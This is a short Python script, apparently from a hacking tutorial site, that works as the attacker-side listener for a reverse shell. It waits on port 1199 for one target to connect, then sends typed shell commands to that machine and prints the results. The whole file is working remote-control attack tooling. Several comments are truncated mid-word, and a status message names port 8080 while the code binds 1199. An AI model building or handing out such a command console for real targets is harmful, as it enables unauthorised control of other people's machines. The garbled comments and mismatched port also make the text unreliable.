# www.UpdateLap.com
# Basic TCP Server

# use python 3 : python3 ServerShell.py

import socket # For Building TCP Connection

def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object$

    s.bind(("0.0.0.0", 1199)) # define the IP and the listening port

    s.listen(1) # define the backlog size, since we are expecting a single connec$
                                                            # target we will list$

    print ("[+] Listening for incoming TCP connection on port 8080")

    conn, addr = s.accept() # accept() function will return the connection object$
                                # port in a tuple format (IP,port)

    print ("[+] We got a connection from: ", addr)


    while True:

        command = input("Shell> ") # Get user input and store it in command varia$
        out = 'terminate'
        if out in command: # If we got terminate command, inform the client and c$
            conn.send(out.encode('utf8'))
            conn.close()
            break


        else:
            conn.send(command.encode('utf8')) # Otherwise we will send the comman$
            print (conn.recv(1024)) # and print the result that we got back

def main ():
    connect()
main()
